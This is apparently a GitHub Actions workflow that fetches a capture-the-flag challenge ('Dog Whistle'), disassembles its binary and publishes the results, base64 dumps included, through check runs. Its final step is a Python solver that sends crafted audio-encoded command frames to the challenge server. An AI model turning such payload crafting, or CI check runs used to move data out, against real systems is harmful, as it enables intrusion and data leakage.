name: Retrieve Dog Whistle source

on:
  push:
    branches: ["arena/01a0e21b-ctf"]

permissions:
  checks: write

jobs:
  retrieve:
    runs-on: ubuntu-latest
    steps:
      - name: Download and list the attachment
        run: |
          set -euo pipefail
          curl --fail --location --retry 3 --retry-delay 2 \
            'https://ctf.h7tex.com/api/v1/challenges/dog-whistle/attachments/b33b6b24-7c55-4876-b3c1-35ec6904a1f7/download?t=1790546275.15f2496600d3df0270a8c64e9eaa4da7bd1b03aab72a1207ecc660892154df03' \
            --output challenge.bin
          mkdir extracted
          if unzip -q challenge.bin -d extracted; then :; else tar -xf challenge.bin -C extracted; fi
          {
            sha256sum challenge.bin
            find extracted -type f -printf '%p\n' | sort
            echo
            find extracted -type f -print0 | xargs -0 file
          } > manifest.txt
          {
            ls -lh extracted/aria
            echo '== dynamic symbols =='
            readelf --wide --dyn-syms extracted/aria
            echo '== strings =='
            strings -a -n 3 extracted/aria
            echo '== disassembly =='
            objdump -d -M intel --no-show-raw-insn extracted/aria
          } > aria-analysis.txt
          base64 -w0 extracted/aria > aria.b64
          base64 -w0 extracted/reference_ping.wav > reference_ping.b64
      - name: Publish reference material
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          publish() {
            local label=$1 source=$2 summary
            summary=$(mktemp)
            { printf '## `%s`\n\n```text\n' "$label"; cat "$source"; printf '\n```\n'; } > "$summary"
            jq -n --arg name "Dog Whistle: $label" --arg sha "$GITHUB_SHA" --rawfile summary "$summary" \
              '{name:$name,head_sha:$sha,status:"completed",conclusion:"success",output:{title:$name,summary:$summary}}' \
              | curl --fail --silent --show-error -X POST "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs" \
                  -H 'Accept: application/vnd.github+json' -H "Authorization: Bearer $GH_TOKEN" \
                  -H 'X-GitHub-Api-Version: 2022-11-28' -d @- > /dev/null
          }
          publish manifest.txt manifest.txt
          publish SPEC.md extracted/SPEC.md
          publish eq.cfg extracted/eq.cfg
          publish aria-analysis.txt aria-analysis.txt
          publish aria.b64 aria.b64
          publish reference_ping.b64 reference_ping.b64
      - name: Exercise the acoustic bridge
        run: |
          set -euo pipefail
          cat > solver.py <<'PY'
          import base64, io, json, math, socket, struct, wave
          def frame(payload):
              b=bytes([0xa5,0x5a,len(payload)])+payload
              b+=bytes([len(payload)^__import__('functools').reduce(int.__xor__,payload,0)])
              return b
          def wav_for(payload, amp=0.25):
              raw=frame(payload)
              ns=[x for byte in raw for x in (byte>>4,byte&15)]
              samples=[0.0]* (200+200*len(ns))
              for i,n in enumerate(ns):
                  for j in range(200):
                      samples[200+i*200+j]=amp*math.sin(2*math.pi*(800+80*n)*j/16000 + (i*1.234567 % 6.283185))
              pcm=b''.join(struct.pack('<i',int(max(-8388608,min(8388607,v*8388607))))[:3] for v in samples for _ in range(6))
              out=io.BytesIO()
              with wave.open(out,'wb') as w:
                  w.setnchannels(1);w.setsampwidth(3);w.setframerate(96000);w.writeframes(pcm)
              return base64.b64encode(out.getvalue()).decode()
          s=socket.create_connection(('pwn.h7tex.com',42356),timeout=15)
          with open('extracted/reference_ping.wav','rb') as f:
              captures=[base64.b64encode(f.read()).decode()]
          captures += [wav_for(b'\x10')]
          captures += [wav_for(b'\x01\x01\x0e\x10\x00', a) for a in [0.03,0.1,0.2]]
          captures += [wav_for(b'\x01\x01\x0e\x02\x01\x00\x00', a) for a in [0.03,0.1,0.2]]
          for capture in captures:
              s.sendall((capture+'\n').encode())
              result=b''
              while b'----\n' not in result:
                  z=s.recv(65536)
                  if not z:break
                  result+=z
              print(result.decode('utf-8','replace'))
          s.close()
          PY
          python3 solver.py > dog-whistle-result.txt
      - name: Publish solver result
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          summary=$(mktemp)
          { printf '## `dog-whistle-result.txt`\n\n```text\n'; cat dog-whistle-result.txt; printf '\n```\n'; } > "$summary"
          jq -n --arg name 'Dog Whistle: solver result' --arg sha "$GITHUB_SHA" --rawfile summary "$summary" \
            '{name:$name,head_sha:$sha,status:"completed",conclusion:"success",output:{title:$name,summary:$summary}}' \
            | curl --fail --silent --show-error -X POST "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs" \
                -H 'Accept: application/vnd.github+json' -H "Authorization: Bearer $GH_TOKEN" \
                -H 'X-GitHub-Api-Version: 2022-11-28' -d @- > /dev/null
